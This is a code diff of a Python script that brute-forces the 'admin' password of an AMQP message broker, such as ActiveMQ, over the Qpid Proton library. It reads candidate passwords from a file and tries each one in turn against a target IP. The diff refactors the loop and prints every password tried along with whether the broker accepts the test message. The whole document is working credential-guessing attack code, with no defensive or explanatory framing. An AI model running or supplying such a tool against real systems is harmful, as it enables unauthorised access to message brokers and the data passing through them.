@@ -1,16 +1,18 @@
 from __future__ import print_function
-from proton import Message
-from proton.handlers import MessagingHandler
-from proton.reactor import Container
 import sys
 import time
 
+from proton import Message
+from proton.handlers import MessagingHandler
+from proton.reactor import Container
+
 class SendHandler(MessagingHandler):
-    def __init__(self, url, address, message_body):
+    def __init__(self, url, address, message_body, password):
         super(SendHandler, self).__init__()
         self.url = url
         self.address = address
         self.message_body = message_body
+        self.password = password
         self.sent = False
 
     def on_start(self, event):
@@ -22,50 +24,41 @@ class SendHandler(MessagingHandler):
         if not self.sent:
             msg = Message(body=self.message_body)
             event.sender.send(msg)
+            print("Message sent!")
+            print(f"Password - {self.password}")
             self.sent = True
             event.sender.close()
             event.connection.close()
 
     def on_accepted(self, event):
-        pass  # Успех — сообщение принято
+        print("Message accepted by server - access OK!")
 
     def on_disconnected(self, event):
-        pass
+        print("Disconnected")
 
     def on_rejected(self, event):
-        pass
+        print("Message rejected:", event.delivery.remote.condition)
 
-def try_password(login, password, target_ip, port, address, message_body):
-    url = f"amqp://{login}:{password}@{target_ip}:{port}"
-    try:
-        container = Container(SendHandler(url, address, message_body))
-        container.run()
-        print(f"Success with password: {password}")
-        return True
-    except Exception as e:
-        print(f"Failed with password: {password} - Error: {e}")
-        return False
-
-
-login = "admin"
-target_ip = "<ip>"
-port = 61616
-address = "testQueue"
-message_body = "test"
-pass_file = "pass.txt"
 
 try:
-    with open(pass_file, 'r') as f:
+    with open('pass.txt', 'r') as f:
         passwords = [line.strip() for line in f if line.strip()]
 except FileNotFoundError:
-    print(f"File {pass_file} not found.")
+    print("File pass.txt not found!")
     sys.exit(1)
 
+login = "admin" 
+ip = ""
+port = "61617"
+address = "testQueue"
+message_body = "test"
 
 for password in passwords:
-    if try_password(login, password, target_ip, port, address, message_body):
-        print("Brute-force successful! Stopping.")
-        break
+    url = f"amqp://{login}:{password}@{ip}:{port}"
+    print(f"Trying password: {password}")
+    try:
+        Container(SendHandler(url, address, message_body, password)).run()
+    except Exception as e:
+        print("Failed:", e)
     time.sleep(1) 
-
-print("Brute-force completed.")
+    print("\n")
